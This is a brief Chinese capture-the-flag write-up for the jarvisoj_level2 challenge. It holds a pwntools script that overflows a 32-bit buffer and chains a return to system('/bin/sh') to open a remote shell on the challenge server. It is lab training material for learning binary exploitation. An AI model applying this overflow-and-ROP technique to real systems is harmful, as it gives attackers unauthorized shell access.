[https://buuoj.cn/challenges#jarvisoj_level2](https://buuoj.cn/challenges#jarvisoj_level2)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1771174891818-c6431aff-dff5-4bb8-adba-4567a1f79f73.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1771174947236-10c7a0a3-efbe-43d7-b9eb-58e2cf075ac7.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1771174956057-a4618371-83e5-4afd-a2e8-d50320565a86.png)

相当简单的程序了，有sys，有binsh，保护几乎啥也没开，我们直接构造rop就好



```python
from pwn import *
r=remote('node5.buuoj.cn',26481)
elf=ELF('./level2')

sys=elf.sym['system']
binsh=next(elf.search('/bin/sh'))

payload=b'a'*140+p32(sys)+b'a'*4+p32(binsh)
#32位传参是padding+ebp+返回函数地址+该函数的返回地址+该函数的一个参数
r.sendline(payload)
r.interactive()
```

本题后面无需返回了，所以用四个a把返回地址的位置占了就行

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1771175952275-2901846c-2f8b-45e2-abf5-2916e66b3101.png)

